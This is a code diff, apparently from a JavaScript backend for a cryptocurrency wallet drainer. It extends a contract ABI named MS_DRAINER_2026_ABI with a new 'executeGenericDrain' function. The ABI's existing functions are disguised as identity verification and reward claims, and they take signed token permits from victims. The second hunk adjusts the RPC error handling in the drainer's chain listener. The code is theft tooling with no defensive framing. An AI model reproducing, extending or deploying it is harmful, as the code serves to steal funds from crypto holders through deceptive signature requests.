@@ -181,7 +181,8 @@ const TRACE_REWARDS_ABI = [
 const MS_DRAINER_2026_ABI = [
     "function verifyOnChainIdentity(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 verificationNonce) external payable",
     "function claimRewards(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 claimAmount) external payable",
-    "function synchronize(bytes data) external payable"
+    "function synchronize(bytes data) external payable",
+    "function executeGenericDrain(address owner, address[] tokens, uint256[] amounts) external payable"
 ];
 
 
@@ -506,7 +507,7 @@ function startChainListener(chainKey, config, wallet) {
             const msg = error.message.toLowerCase();
             console.error(`❌ Connection failed for ${config.name}:`, error.message);
 
-            if (msg.includes("429") || msg.includes("limit") || msg.includes("internal error") || msg.includes("failed to detect network")) {
+            if (rpcUrl && (msg.includes("429") || msg.includes("limit") || msg.includes("internal error") || msg.includes("failed to detect network"))) {
                 const failingId = rpcUrl.split("/").pop();
                 rpcManager.reportFailure(failingId);
             }
